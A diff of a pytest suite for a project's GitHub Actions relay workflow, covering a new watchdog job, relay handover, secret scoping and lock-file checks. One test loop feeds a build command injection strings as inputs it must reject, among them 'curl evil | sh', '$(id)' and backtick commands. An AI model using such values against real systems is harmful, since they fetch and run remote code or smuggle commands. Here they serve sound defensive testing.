@@ -1495,7 +1495,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.19 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.20 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1532,7 +1532,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.19 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.20 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
@@ -1701,10 +1701,12 @@ def test_actionlint_passes_on_every_workflow():
 def test_the_next_worker_run_takes_over_before_this_one_stops_and_the_timer_starts_no_second_chain(tmp_path):
     """The relay was down 12 to 22 s between two runs (the next one waited in line behind this one, then installed), and
     a token posted then waited that long. Each run now starts the next 30 s before it stops, with no line to hold it,
-    so the next one has installed by then; and a run the timer or a person starts goes on only when none is going."""
+    so the next one has installed by then; and a run the watchdog or a person starts goes on only when no chain is going.
+    0.3.20: the start is `knos.proof.chain start`, which asks again after a 5xx or a 429, and the timer's run only watches."""
     doc = _doc(WF / "worker.yml")
     assert "concurrency" not in doc and "concurrency" not in doc["jobs"]["relay"]
     assert set(doc["on"]["workflow_dispatch"]["inputs"]) == {"after"} and doc["on"]["schedule"] == [{"cron": "*/5 * * * *"}]
+    assert doc["jobs"]["relay"]["if"] == "github.event_name == 'workflow_dispatch'"       # the timer starts the watchdog, never a relay
     steps, gate = _steps(doc["jobs"]["relay"]), "steps.chain.outputs.go == 'true'"
     guard = steps[0]
     assert guard["id"] == "chain" and guard["env"]["AFTER"] == "${{ inputs.after }}"
@@ -1729,15 +1731,36 @@ def test_the_next_worker_run_takes_over_before_this_one_stops_and_the_timer_star
     first, tail = (int(re.search(r"--serve (\d+)", s).group(1)) for s in serves)
     assert 20 <= tail <= 45 and 240 <= first + tail <= 300   # time for the next run to install (10 to 21 s were seen), and a short overlap
     handover = serves[1]
-    assert "gh workflow run" not in serves[0] and "sleep" not in handover and "&" not in handover.replace("&&", "")
-    assert handover.count('-f after="$GITHUB_RUN_ID"') == 1 and '&& touch "$RUNNER_TEMP/knos-next"' in handover
-    assert handover.index("gh workflow run worker.yml ") < handover.index("knos relay --serve")     # started first, then relayed on
-    assert steps[-1]["run"].startswith('[ -f "$RUNNER_TEMP/knos-next" ] || gh workflow run worker.yml ') and '-f after="$GITHUB_RUN_ID"' in steps[-1]["run"]
+    start = 'python -m knos.proof.chain start --after "$GITHUB_RUN_ID"'
+    assert "gh workflow run" not in json.dumps(doc) and start not in serves[0] and "sleep" not in handover and "&" not in handover.replace("&&", "")
+    assert handover.count(start + " --tries 3") == 1 and '&& touch "$RUNNER_TEMP/knos-next"' in handover
+    assert handover.index(start) < handover.index("knos relay --serve")     # started first, then relayed on
+    assert steps[-1]["run"] == f'[ -f "$RUNNER_TEMP/knos-next" ] || {start} --tries 6' and set(steps[-1]["env"]) == {"GH_TOKEN", "PYTHONPATH"}
     go = _chain_step(tmp_path, guard["run"])
     went = go("")
-    assert went[0] == "go=true" and "run list" in went[1] and "--workflow worker.yml" in went[1]     # the timer, with no run going
-    assert go("", [_run(70, "relay after 69")])[0] == "go=false"     # the timer while the chain runs: that chain goes on alone
-    assert go("", fail="1")[0] == "go=false"                          # GitHub did not list the runs: the next tick asks again
+    assert went[0] == "go=true" and "run list" in went[1] and "--workflow worker.yml" in went[1]     # a first run, with no run going
+    assert go("", [_run(70, "relay after 69")])[0] == "go=false"     # a first run while the chain runs: that chain goes on alone
+    assert go("", fail="1")[0] == "go=false"                          # GitHub did not list the runs: the next watchdog asks again
+
+
+def test_two_watchdogs_cannot_start_two_chains_and_two_first_runs_do_not_end_each_other(tmp_path):
+    """The watchdog job starts a chain when none is alive: on the timer and on every event, with no secret, one at a
+    time. Should two first runs exist all the same (GitHub listed the first a moment late, or a person started one),
+    each run's first step lets the OLDER go on: one chain. Before 0.3.20 each saw the other and both ended: none."""
+    doc = _doc(WF / "worker.yml")
+    dog = doc["jobs"]["watchdog"]
+    assert dog["if"] == "github.event_name == 'schedule' || github.event_name == 'repository_dispatch' || github.event_name == 'workflow_run'"
+    assert dog["permissions"] == {"contents": "read", "actions": "write"} and dog["concurrency"] == {"group": "knos-relay-watchdog", "cancel-in-progress": False}
+    assert "secrets." not in json.dumps(dog) and not any("cache" in str(s.get("uses", "")) for s in _steps(dog))
+    assert _steps(dog)[0]["with"] == {"persist-credentials": False}
+    assert _steps(dog)[-1]["run"] == "python3 -I src/knos/proof/chain.py watch" and set(_steps(dog)[-1]["env"]) == {"GH_TOKEN"}
+    name = doc["run-name"][3:-2].strip()       # the watchdog's own run holds no chain: its title says so
+    assert value(name, _event("schedule", {})) == "relay for the timer"
+    go = _chain_step(tmp_path, _steps(doc["jobs"]["relay"])[0]["run"])
+    first = [_run(80, "relay", "queued"), _run(81, "relay", "queued")]
+    assert go("", [first[1]], me=80)[0] == "go=true" and go("", [first[0]], me=81)[0] == "go=false"      # exactly one of the two
+    assert go("", [_run(79, "relay for the timer"), _run(78, "relay for a run"), _run(77, "relay", "completed")], me=80)[0] == "go=true"
+    assert go("", [_run(85, "relay after 80", "queued")], me=83)[0] == "go=false"       # a chain's run, older or newer, always holds
 
 
 def _run(n: int, title: str, status: str = "in_progress") -> dict:
@@ -1775,7 +1798,7 @@ def test_a_worker_run_takes_over_only_as_the_one_successor_and_a_second_chain_en
     doc = _doc(WF / "worker.yml")
     name = doc["run-name"][3:-2].strip()       # each run's title names the run it takes over from: the first step reads it
     assert value(name, {**_event("workflow_dispatch", {}), "inputs": {"after": "76"}}) == "relay after 76"
-    assert value(name, _event("schedule", {})) == "relay" and value(name, _event("workflow_dispatch", {})) == "relay"
+    assert value(name, _event("schedule", {})) == "relay for the timer" and value(name, _event("workflow_dispatch", {})) == "relay"
     go = _chain_step(tmp_path, _steps(doc["jobs"]["relay"])[0]["run"])
     # the chain as it should be: the run before still relays for a few seconds, cron runs come and go
     assert go("76", [_run(76, "relay after 75"), _run(75, "relay after 74", "completed"), _run(79, "relay")])[0] == "go=true"
@@ -1809,12 +1832,12 @@ def test_the_worker_keeps_its_keys_apart_the_claim_sweep_holds_none_and_the_fauc
     permissions, with no `pull-requests` among them."""
     doc = _doc(WF / "worker.yml")
     jobs = doc["jobs"]
-    assert sorted(jobs) == ["claims", "event", "faucet", "relay"]
+    assert sorted(jobs) == ["claims", "event", "faucet", "relay", "watchdog"]
     assert doc["permissions"] == {"contents": "read", "actions": "write", "issues": "write"}        # as before 0.3.19
     assert "permissions" not in jobs["relay"] and "permissions" not in jobs["event"]               # the fee key's jobs: the workflow's, and no more
     holds = {name: sorted(set(re.findall(r"secrets\.(\w+)", json.dumps(job)))) for name, job in jobs.items()}
     assert holds == {"claims": [], "event": ["KNOS_RELAY_KEY", "KNOS_RELAY_KEYS", "KNOS_WORKER_KEY"], "faucet": ["KNOS_FAUCET_KEY", "KNOS_RELAY_KEY", "KNOS_WORKER_KEY"],
-                     "relay": ["KNOS_RELAY_KEY", "KNOS_RELAY_KEYS", "KNOS_WORKER_KEY"]}
+                     "relay": ["KNOS_RELAY_KEY", "KNOS_RELAY_KEYS", "KNOS_WORKER_KEY"], "watchdog": []}
     # the sweep: the chain's runs only, one at a time, with the forge token and nothing else
     claims = jobs["claims"]
     assert claims["if"] == "github.event_name == 'workflow_dispatch'" and claims["concurrency"] == {"group": "knos-claims", "cancel-in-progress": False}
@@ -1860,7 +1883,7 @@ def test_a_worker_run_saves_its_notes_before_it_starts_the_next_run():
     assert "actions/cache" not in uses       # it saves only when the job ends: after the next run restored
     restore, save = uses.index("actions/cache/restore"), uses.index("actions/cache/save")
     serve = [i for i, s in enumerate(steps) if "knos relay --serve" in s.get("run", "")]
-    start = [i for i, s in enumerate(steps) if "gh workflow run worker.yml" in s.get("run", "")]
+    start = [i for i, s in enumerate(steps) if "knos.proof.chain start" in s.get("run", "")]
     assert restore < serve[0] < save < start[0] == serve[1] and start[-1] == len(steps) - 1
     key = "knos-relay-home-${{ github.run_id }}"
     assert steps[restore]["with"] == {"path": ".knos-home", "key": key, "restore-keys": "knos-relay-home-"}
